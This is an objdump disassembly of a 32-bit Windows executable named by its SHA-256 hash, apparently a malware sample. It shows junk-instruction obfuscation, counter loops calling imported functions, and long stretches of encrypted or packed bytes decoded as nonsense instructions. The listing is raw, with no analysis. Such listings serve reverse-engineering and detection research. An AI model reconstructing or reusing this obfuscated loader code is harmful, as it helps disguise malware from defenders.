
9cabd9d04d2555aa194a207511ae66b9622487c4a0045dd1121a468ee32ef466.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43470b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4345e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434653
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4345f3,0x434647
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43470b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43463b,0x10
  40104d:	cmp    DWORD PTR ds:0x43463b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43463b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43463b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43463b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43463b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43463b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43463b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43470f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43465f
  4010b6:	mov    ebx,DWORD PTR ds:0x434733
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434607,0x43468b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43468f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43468f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43468f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43468f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43468f,0xe
  401103:	jne    0x401119
  401109:	push   0x4345eb
  40110e:	push   0x43495b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43468f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43468f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43468f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4345eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xb1141829
  401151:	popf   
  401152:	loope  0x4011d2
  401154:	jle    0x4011d4
  401156:	jle    0x40110d
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	push   cs
  401168:	mov    dl,0xc
  40116a:	rdpmc  
  40116c:	bswap  esp
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x6555d56a
  401207:	xchg   edi,eax
  401208:	pop    ss
  401209:	enter  0x2d2d,0xce
  40120d:	fbld   TBYTE PTR [edx]
  40120f:	inc    ebp
  401210:	mov    dl,0x6f
  401212:	adc    BYTE PTR [edi-0x5e],cl
  401215:	add    edi,DWORD PTR [edi-0x6b79ce75]
  40121b:	daa    
  40121c:	loop   0x40129d
  40121e:	mov    edi,0x4db99f09
  401223:	pop    esi
  401224:	call   0xc67e:0x68c318f7
  40122b:	enter  0xd4ff,0x65
  40122f:	loopne 0x401222
  401231:	scas   al,BYTE PTR es:[edi]
  401232:	mov    esi,0xbdd96c73
  401237:	pop    ds
  401238:	jmp    0xccd339bc
  40123d:	cmp    al,0xe7
  40123f:	sahf   
  401240:	int    0x4b
  401242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401243:	mov    al,bh
  401245:	xchg   ecx,eax
  401246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401247:	int3   
  401248:	sbb    BYTE PTR ds:0xeb72f259,ah
  40124e:	cmp    BYTE PTR [eax],bh
  401250:	adc    BYTE PTR [ecx-0x770f7f62],0xfe
  401257:	out    dx,al
  401258:	(bad)  
  401259:	mov    ah,0x48
  40125b:	xor    al,0x3a
  40125d:	popf   
  40125e:	dec    esi
  40125f:	dec    edi
  401260:	pop    eax
  401261:	sbb    al,0x3e
  401263:	out    0x85,al
  401265:	fdiv   st,st(7)
  401267:	(bad)  
  401269:	adc    ebx,DWORD PTR [ecx+0x3f]
  40126c:	jge    0x401211
  40126e:	aas    
  40126f:	mov    esi,DWORD PTR [ebx-0x31]
  401272:	jbe    0x4012b7
  401274:	lds    ecx,FWORD PTR [eax+0x6f6fbcc4]
  40127a:	cmc    
  40127b:	in     eax,0x3
  40127d:	jp     0x40120e
  40127f:	call   0xf2f87eb5
  401284:	push   esp
  401285:	mov    edi,0x40d1647c
  40128a:	out    0x29,eax
  40128c:	push   edx
  40128d:	inc    edi
  40128e:	aad    0x8d
  401290:	xor    BYTE PTR [ecx],al
  401292:	mov    ecx,0xaa97db57
  401297:	outs   dx,BYTE PTR ds:[esi]
  401298:	pushf  
  401299:	jmp    0xcc84:0xa0e7
  40129f:	pushf  
  4012a0:	mov    WORD PTR [ecx+edx*4],fs
  4012a3:	rcl    BYTE PTR [ebx+0xbcfe02e],0xe
  4012aa:	pop    ss
  4012ab:	(bad)  
  4012ac:	pcmpgtd mm4,QWORD PTR [ecx]
  4012af:	cld    
  4012b0:	lock pop eax
  4012b2:	sub    eax,0x3877fcac
  4012b7:	xchg   BYTE PTR [edx],bh
  4012b9:	jp     0x401246
  4012bb:	mov    eax,0x12de9e93
  4012c0:	sub    BYTE PTR [ebx-0x143fe911],0xf1
  4012c7:	mov    edi,0x1b16b86
  4012cc:	cwde   
  4012cd:	jg     0x4012fc
  4012cf:	shl    dh,0x94
  4012d2:	adc    BYTE PTR [edx],ch
  4012d4:	inc    edi
  4012d5:	xchg   edi,eax
  4012d6:	retf   0x7697
  4012d9:	scas   eax,DWORD PTR es:[edi]
  4012da:	mov    esi,0xaf34cbd8
  4012df:	cmp    DWORD PTR [esi+0x75e0989e],esi
  4012e5:	loop   0x4012f6
  4012e7:	push   edi
  4012e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012e9:	add    al,0xdb
  4012eb:	push   ebx
  4012ec:	sti    
  4012ed:	(bad)  
  4012ee:	cwde   
  4012ef:	les    esi,FWORD PTR [edi]
  4012f1:	mov    BYTE PTR [esi-0x3e27db2a],dh
  4012f7:	xchg   edi,eax
  4012f8:	mov    eax,0xf31d8ff5
  4012fd:	repnz sub eax,0x8a6cfe72
  401303:	jo     0x4012a9
  401305:	scas   al,BYTE PTR es:[edi]
  401306:	sbb    esi,DWORD PTR [ebx+0x1e]
  401309:	jle    0x40135c
  40130b:	mov    ecx,0x3bb92f6c
  401310:	or     al,0x82
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x43467f,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43463f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4345ef,0x4345e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4345f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4346c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4346c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4346c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4346c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4346c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4346c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4346c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4346c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43463f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43468b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4345ef,0x43463f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4345eb,0x4346f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434603,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [eax-0x4ab6ded8],ebp
  40141c:	jg     0x40149c
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x40142f
  401424:	retf   0x9f98
  401427:	fs ss loope 0x4013e4
  40142b:	xor    BYTE PTR [eax-0x6a],0x8a
  40142f:	mov    ch,0x47
  401431:	jp     0x401432
  401433:	adc    al,0xb9
  401435:	cs mov ah,0x3b
  401438:	scas   eax,DWORD PTR es:[edi]
  401439:	fs mov esp,ebx
  40143c:	mov    ds:0xe9bc788e,eax
  401441:	add    ecx,ebp
  401443:	pop    es
  401444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401445:	sbb    eax,0xe5de970
  40144a:	sti    
  40144b:	fst    DWORD PTR [edi+0x2f]
  40144e:	sbb    edi,eax
  401450:	sti    
  401451:	xchg   edi,eax
  401452:	add    dl,BYTE PTR [eax+0x3c]
  401455:	movaps xmm0,xmm1
  401458:	sti    
  401459:	xor    eax,0x261c35cf
  40145e:	push   0xb51ca26f
  401463:	cdq    
  401464:	shl    DWORD PTR [edi-0x67915d7],1
  40146a:	dec    eax
  40146b:	sub    ch,BYTE PTR [esi-0x3e85a02]
  401471:	jae    0x401449
  401473:	sub    edi,DWORD PTR ds:0x8563a0a3
  401479:	or     ch,BYTE PTR [esi-0x12]
  40147c:	inc    ecx
  40147d:	pop    ecx
  40147e:	mov    esp,DWORD PTR [eax+0x7f]
  401481:	sbb    eax,DWORD PTR [ecx]
  401483:	pop    ecx
  401484:	test   DWORD PTR [ebx+eiz*4-0x4446d88d],edx
  40148b:	dec    ebx
  40148c:	mov    bl,0x99
  40148e:	out    0xec,al
  401490:	retf   0x3be2
  401493:	and    DWORD PTR [esi-0x159823ca],esi
  401499:	mov    ecx,0x8758d67a
  40149e:	pop    edi
  40149f:	jmp    0x53c68f3c
  4014a4:	or     eax,0x266141ea
  4014a9:	call   0xdff254f1
  4014ae:	aas    
  4014af:	js     0x40148e
  4014b1:	dec    esp
  4014b2:	pop    ss
  4014b3:	cmc    
  4014b4:	iret   
  4014b5:	fwait
  4014b6:	jge    0x401479
  4014b8:	jmp    0x6509eda4
  4014bd:	popf   
  4014be:	sbb    DWORD PTR [ecx+0x6037330b],ebp
  4014c4:	sahf   
  4014c5:	jae    0x40149c
  4014c7:	jno    0x401519
  4014c9:	sub    BYTE PTR [edx],0x3
  4014cc:	sbb    al,0xe7
  4014ce:	fnsave fs:[ecx+0x73]
  4014d2:	pop    eax
  4014d3:	sbb    ch,BYTE PTR [eax+esi*8]
  4014d6:	and    eax,0x9d4eaf2f
  4014db:	hlt    
  4014dc:	leave  
  4014dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014de:	dec    esi
  4014df:	retf   0x27e4
  4014e2:	add    BYTE PTR [esi],ah
  4014e4:	add    ebp,DWORD PTR [ebx+0x4fd00e54]
  4014ea:	test   al,0x3a
  4014ec:	mov    bh,0x31
  4014ee:	scas   eax,DWORD PTR es:[edi]
  4014ef:	mov    edi,0x85f35ffc
  4014f4:	icebp  
  4014f5:	cmp    al,dh
  4014f7:	cwde   
  4014f8:	out    dx,al
  4014f9:	lods   al,BYTE PTR ds:[esi]
  4014fa:	xchg   edx,eax
  4014fb:	push   ebx
  4014fc:	inc    edi
  4014fd:	mov    ebp,0x4a41fa84
  401502:	xchg   edi,eax
  401503:	adc    bl,dl
  401505:	mov    dh,0xdf
  401507:	xchg   dx,ax
  401509:	loopne 0x4014be
  40150b:	sbb    al,BYTE PTR [edi]
  40150d:	sub    BYTE PTR [ecx-0x2f],al
  401510:	xlat   BYTE PTR ds:[ebx]
  401511:	retf   
  401512:	fwait
  401513:	lea    edx,[ebp-0x57086d79]
  401519:	cdq    
  40151a:	in     al,0xfb
  40151c:	mov    bh,0x3e
  40151e:	call   0xaab5:0xa1267fc0
  401525:	and    dl,ah
  401527:	enter  0xe05d,0xb9
  40152b:	call   0x6e47:0x60de79ed
  401532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401533:	mov    ah,0x4e
  401535:	xchg   esi,eax
  401536:	loope  0x40154d
  401538:	xor    al,0xe
  40153a:	ins    BYTE PTR es:[edi],dx
  40153b:	mov    esi,0xf90890e7
  401540:	stos   DWORD PTR es:[edi],eax
  401541:	add    eax,0x56be20cc
  401546:	mov    ds:0xe37ce881,al
  40154b:	fs dec ecx
  40154d:	aaa    
  40154e:	adc    esp,ecx
  401550:	out    dx,eax
  401551:	ror    DWORD PTR [edx+0x4476bb55],cl
  401557:	outs   dx,BYTE PTR ds:[esi]
  401558:	push   edi
  401559:	je     0x40152d
  40155b:	jp     0x4015be
  40155d:	mov    ebx,0x65b188f1
  401562:	mov    bh,0x5
  401564:	pop    edi
  401565:	lock call 0x90166ed
  40156b:	clc    
  40156c:	mov    ecx,0xf4743ae0
  401571:	xlat   BYTE PTR es:[ebx]
  401573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401574:	sub    eax,0x7b3c8672
  401579:	lds    eax,FWORD PTR [ecx+0x40e109d8]
  40157f:	xchg   edi,eax
  401580:	or     BYTE PTR [ebp-0x2f9d205f],ch
  401586:	xchg   BYTE PTR [esi+0x58a824de],dh
  40158c:	jl     0x4015e5
  40158e:	mul    edi
  401590:	fwait
  401591:	add    eax,0x1e9bb904
  401596:	jecxz  0x4015b4
  401598:	mov    bl,0x18
  40159a:	popa   
  40159b:	fidiv  DWORD PTR [edi]
  40159d:	jl     0x401611
  40159f:	(bad)  
  4015a1:	push   0xf88b528
  4015a6:	jnp    0x401608
  4015a8:	push   ds
  4015a9:	mov    ebx,0x3803415c
  4015ae:	or     BYTE PTR [edi-0x61],al
  4015b1:	pop    edx
  4015b2:	xchg   edx,eax
  4015b3:	mov    ds:0xfff22be5,eax
  4015b8:	mov    bl,0xe3
  4015ba:	inc    esp
  4015bb:	ffreep st(7)
  4015bd:	adc    ebx,DWORD PTR [edi]
  4015bf:	mov    ebx,0x7a92fab5
  4015c4:	les    ebx,FWORD PTR [edx]
  4015c6:	cs jb  0x4015f3
  4015c9:	adc    eax,DWORD PTR [edx]
  4015cb:	sbb    DWORD PTR [esi+0xf57fc5d],esp
  4015d1:	dec    edi
  4015d2:	jg     0x401643
  4015d4:	nop
  4015d5:	jecxz  0x401586
  4015d7:	aas    
  4015d8:	sub    eax,0x8458bcf
  4015dd:	mov    ecx,DWORD PTR ds:0x43470f
  4015e3:	and    DWORD PTR ds:0x4346bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4345e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434643,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434693,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434683,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434683
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434683,ecx
  40162d:	cmp    DWORD PTR ds:0x434683,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434683,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434683
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434683,ecx
  40165f:	cmp    DWORD PTR ds:0x434683,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434623
  401674:	mov    eax,ds:0x43466b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4346cb,0x4346f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4345eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4345ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	scas   eax,DWORD PTR es:[edi]
  4016ba:	imul   ebp,edx,0x1b
  4016bd:	in     al,dx
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x40170f
  4016c6:	inc    eax
  4016c7:	mov    eax,0xf22e9c5e
  4016cc:	mov    ebx,0xf464b22f
  4016d1:	lahf   
  4016d2:	scas   eax,DWORD PTR es:[edi]
  4016d3:	sub    DWORD PTR [ebx],0x12
  4016d6:	adc    dh,BYTE PTR [edx-0x21]
  4016d9:	ins    BYTE PTR es:[edi],dx
  4016da:	ret    
  4016db:	cmc    
  4016dc:	cmp    al,0xed
  4016de:	jbe    0x40175f
  4016e0:	ret    
  4016e1:	mov    cl,0xe5
  4016e3:	(bad)  
  4016e4:	jns    0x4016a4
  4016e6:	and    DWORD PTR [esi-0x3c],esi
  4016e9:	fisubr DWORD PTR ds:0xa134a306
  4016ef:	call   0xd2c86b21
  4016f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f5:	sub    al,0x27
  4016f7:	mov    bl,0x54
  4016f9:	icebp  
  4016fa:	sub    eax,0xe097af42
  4016ff:	cmp    BYTE PTR [edi+0x1e4a693],cl
  401705:	loope  0x401690
  401707:	out    dx,eax
  401708:	out    dx,al
  401709:	fbstp  TBYTE PTR [ebp+0x5ef86e85]
  40170f:	repz jo 0x401770
  401712:	fisttp WORD PTR [esi+0x43e58c26]
  401718:	inc    ebp
  401719:	jmp    0x4016ee
  40171b:	in     al,dx
  40171c:	dec    ebp
  40171d:	adc    esi,DWORD PTR [ebp+0x5d67231f]
  401723:	mov    ecx,0x80b20653
  401728:	sub    eax,0xe1537cf8
  40172d:	adc    al,0x45
  40172f:	ins    DWORD PTR es:[edi],dx
  401730:	sbb    ch,BYTE PTR [eax+0x43]
  401733:	mov    ebx,0xe267e441
  401738:	sbb    dh,BYTE PTR [ebp+edx*4+0x28]
  40173c:	sub    ax,0x22c2
  401740:	out    0x94,eax
  401742:	jnp    0x401716
  401744:	mov    al,ds:0x538121f6
  401749:	push   ecx
  40174a:	in     eax,dx
  40174b:	sbb    bh,BYTE PTR [edx-0x1958d8e5]
  401751:	test   cl,bl
  401753:	enter  0x2ec2,0x1
  401757:	xlat   BYTE PTR ds:[ebx]
  401758:	inc    eax
  401759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40175a:	loope  0x4017d1
  40175c:	lahf   
  40175d:	ss js  0x401728
  401760:	mov    bh,0x5b
  401762:	xchg   ebx,eax
  401764:	sti    
  401765:	push   ss
  401766:	xor    esi,DWORD PTR [ebx]
  401768:	xor    eax,DWORD PTR [edi-0x40c76829]
  40176e:	cld    
  40176f:	test   BYTE PTR [ebx],dl
  401771:	adc    al,0xbb
  401773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401774:	sub    BYTE PTR [edi+0x27],dl
  401777:	rcr    esi,0x8f
  40177a:	lods   eax,DWORD PTR ds:[esi]
  40177b:	dec    ecx
  40177c:	cmp    cl,BYTE PTR [eax+eiz*1+0x1c9e0175]
  401783:	(bad)  
  401784:	pop    ds
  401785:	idiv   BYTE PTR [edx*2-0x77607fe3]
  40178c:	loopne 0x401728
  40178e:	aaa    
  40178f:	das    
  401790:	test   al,0x10
  401792:	in     al,0xfc
  401794:	sbb    ecx,DWORD PTR [eax+0x832ff99]
  40179a:	rcr    bl,0x5b
  40179d:	enter  0xd459,0x3
  4017a1:	pop    eax
  4017a2:	push   0xffffffca
  4017a4:	imul   eax,edi,0x5ec2bab5
  4017aa:	adc    BYTE PTR [eax+0x162357be],0xd9
  4017b1:	push   ebp
  4017b2:	cwde   
  4017b3:	inc    ecx
  4017b4:	repnz xchg ecx,eax
  4017b6:	and    ch,BYTE PTR [edi]
  4017b8:	xchg   bh,bl
  4017ba:	in     al,dx
  4017bb:	xchg   DWORD PTR [ebp-0x3a],eax
  4017be:	inc    ebx
  4017bf:	je     0x401786
  4017c1:	push   0x3166210e
  4017c6:	fdivr  DWORD PTR [ecx+0x5f]
  4017c9:	push   ss
  4017ca:	aaa    
  4017cb:	push   0xab665c19
  4017d0:	jp     0x401844
  4017d2:	mov    DWORD PTR [edx-0x6d],ecx
  4017d5:	mov    ch,bl
  4017d7:	inc    eax
  4017d8:	mov    ah,0x17
  4017da:	cdq    
  4017db:	ja     0x4017f1
  4017dd:	mov    bh,dh
  4017df:	fst    DWORD PTR [eax]
  4017e1:	mov    esp,0x5c57a4c1
  4017e6:	lds    ebx,FWORD PTR [ebx+0x3b]
  4017e9:	fcmovnb st,st(1)
  4017eb:	mov    esp,0xecd0d662
  4017f0:	sbb    DWORD PTR [edi-0x7e],eax
  4017f3:	idiv   DWORD PTR ds:0x3a266289
  4017f9:	out    dx,al
  4017fa:	fisubr DWORD PTR [edx-0x9587ed9]
  401800:	arpl   WORD PTR ds:0x3eacaddd,sp
  401806:	das    
  401807:	(bad)  
  401808:	ja     0x4017a2
  40180a:	outs   dx,DWORD PTR ds:[esi]
  40180b:	shl    DWORD PTR [eax+0x1b43e543],cl
  401811:	out    0xe2,eax
  401813:	call   0x387:0x77ad808b
  40181a:	sbb    BYTE PTR [esi-0x20],cl
  40181d:	jmp    FWORD PTR [ebx-0x17fbd063]
  401823:	mov    al,0xc1
  401825:	popa   
  401826:	fsubr  DWORD PTR [ebp+0x642e4021]
  40182c:	push   ecx
  40182d:	pop    ecx
  40182e:	sbb    bl,cl
  401830:	fmul   DWORD PTR [ebp-0x2344e55b]
  401836:	shr    eax,0xd8
  401839:	out    0xe8,eax
  40183b:	pop    edx
  40183c:	aad    0x9e
  40183e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401840:	jg     0x4017c2
  401842:	in     eax,dx
  401843:	push   eax
  401844:	in     eax,0x5d
  401846:	sub    bh,BYTE PTR [ebx]
  401848:	dec    ebx
  401849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40184a:	iret   
  40184b:	in     eax,dx
  40184c:	xor    al,0xaa
  40184e:	xor    eax,0x7f7678d
  401853:	jmp    0x401862
  401855:	xor    eax,0x52b8cca7
  40185a:	or     BYTE PTR [ecx],0xd8
  40185d:	adc    BYTE PTR [ecx+0xc34dfc5],ah
  401863:	mov    ch,0x92
  401865:	test   DWORD PTR [edx-0x123208b5],0x4291b883
  40186f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401870:	bound  ebx,QWORD PTR [esi]
  401872:	adc    eax,0x744b20b5
  401877:	push   edi
  401878:	pushf  
  401879:	jl     0x401839
  40187b:	and    eax,0x427850f
  401880:	add    BYTE PTR [eax],al
  401882:	mov    ecx,DWORD PTR ds:0x434703
  401888:	or     DWORD PTR ds:0x4345e3,ecx
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [edi+ebx*1],cl
  4018a1:	fsub   QWORD PTR ds:0x7e7e7b1b
  4018a7:	mov    ch,0x7f
  4018a9:	jle    0x401929
  4018ab:	mov    DWORD PTR [ecx],ebp
  4018ad:	popf   
  4018ae:	cmp    eax,0xd95fb437
  4018b3:	das    
  4018b4:	mov    edi,0xe8b87cce
  4018b9:	add    edi,edx
  4018bb:	push   eax
  4018bc:	ds ins BYTE PTR es:[edi],dx
  4018be:	pop    es
  4018bf:	sbb    al,0xee
  4018c1:	push   es
  4018c2:	neg    BYTE PTR [edx-0x59c3cd29]
  4018c8:	lods   eax,DWORD PTR ds:[esi]
  4018c9:	aam    0x55
  4018cb:	int3   
  4018cc:	inc    ecx
  4018cd:	inc    edi
  4018ce:	fisubr WORD PTR [edx]
  4018d0:	dec    ebp
  4018d1:	ret    
  4018d2:	addr16 nop ecx
  4018d6:	xor    esi,ebp
  4018d8:	and    BYTE PTR [ebx],0xf4
  4018db:	xchg   edx,eax
  4018dc:	push   es
  4018dd:	int    0x8f
  4018df:	inc    ebx
  4018e0:	dec    eax
  4018e1:	jp     0x401911
  4018e3:	jae    0x40193b
  4018e5:	or     ecx,DWORD PTR [eax-0x12]
  4018e8:	int    0xf7
  4018ea:	push   cs
  4018eb:	pusha  
  4018ec:	sbb    DWORD PTR [eax-0x1eacd50b],0xe9691cfd
  4018f6:	outs   dx,BYTE PTR ds:[esi]
  4018f7:	inc    eax
  4018f8:	outs   dx,DWORD PTR ds:[esi]
  4018f9:	cmp    DWORD PTR [eax],eax
  4018fb:	hlt    
  4018fc:	stc    
  4018fd:	(bad)  
  4018fe:	push   ds
  4018ff:	scas   al,BYTE PTR es:[edi]
  401900:	xchg   edx,eax
  401901:	cmp    eax,esp
  401903:	(bad)  
  401904:	int3   
  401905:	enter  0xf375,0x6b
  401909:	aaa    
  40190a:	push   eax
  40190b:	test   al,0xd0
  40190d:	lea    eax,[eax]
  40190f:	lock es popf 
  401912:	daa    
  401913:	push   eax
  401914:	push   ds
